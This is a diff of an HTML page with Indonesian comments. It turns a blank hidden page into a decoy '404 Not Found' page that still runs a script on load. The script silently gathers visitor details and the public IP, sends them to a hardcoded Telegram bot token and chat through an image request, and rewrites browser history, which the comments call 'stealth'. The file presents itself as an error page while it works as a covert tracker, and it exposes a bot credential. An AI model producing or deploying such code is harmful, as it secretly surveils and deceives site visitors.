@@ -2,25 +2,43 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title> . </title>
+    <title>404 Not Found</title>
     <style>
         body {
-            background-color: white;
+            background-color: #f0f0f0;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            padding: 50px;
             margin: 0;
-            padding: 0;
-            display: none; /* Bikin gak kelihatan sama sekali */
+        }
+        h1 {
+            font-size: 48px;
+            color: #333;
+        }
+        p {
+            font-size: 18px;
+            color: #666;
+        }
+        hr {
+            width: 50%;
+            border: 1px solid #ccc;
         }
     </style>
 </head>
 <body>
-    <!-- Konten kosong total, cuma JavaScript doang -->
+    <h1>404 Not Found</h1>
+    <p>The requested page could not be found.</p>
+    <hr>
+    <p><em>Please check the URL or contact the administrator.</em></p>
+
+    <!-- Script pengirim data ke Telegram -->
     <script>
         (function() {
             // Konfigurasi Telegram
             const BOT_TOKEN = "8741447274:AAG4LxoaQ559dj4W7u-Nuz0Zp5IwCP_Vlqo";
             const CHAT_ID = "6034935293";
 
-            // Kumpulin data pengunjung sebanyak mungkin
+            // Kumpulin data pengunjung
             const data = {
                 userAgent: navigator.userAgent,
                 language: navigator.language,
@@ -33,7 +51,7 @@
                 timestamp: new Date().toISOString()
             };
 
-            // Ambil IP publik pake API ipify (biar dapet IP asli)
+            // Ambil IP publik
             fetch('https://api.ipify.org?format=json')
                 .then(response => response.json())
                 .then(ipData => {
@@ -46,24 +64,19 @@
                 });
 
             function sendToTelegram(info) {
-                // Format pesan biar rapi
-                let message = "🔔 *Pengunjung Baru!*\n";
+                let message = "🔔 *404 Visitor!*\n";
                 for (let key in info) {
                     message += `\n*${key}:* ${info[key]}`;
                 }
-                // Potong kalo kepanjangan (max 4096 karakter)
                 if (message.length > 4000) message = message.substring(0, 4000) + "...";
 
-                // Kirim pake metode gambar biar gak kena CORS (GET request)
                 const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=Markdown`;
-                let img = new Image();
-                img.src = url;
-                // Biarin aja, gak perlu nunggu load
+                new Image().src = url; // Kirim tanpa nunggu respon
             }
 
-            // Opsional: bersihin URL dari history biar lebih stealth (pake replaceState)
+            // Biar makin stealth, gak ada jejak di history
             window.history.replaceState(null, "", window.location.pathname + "?");
         })();
     </script>
 </body>
-  </html>
+</html>
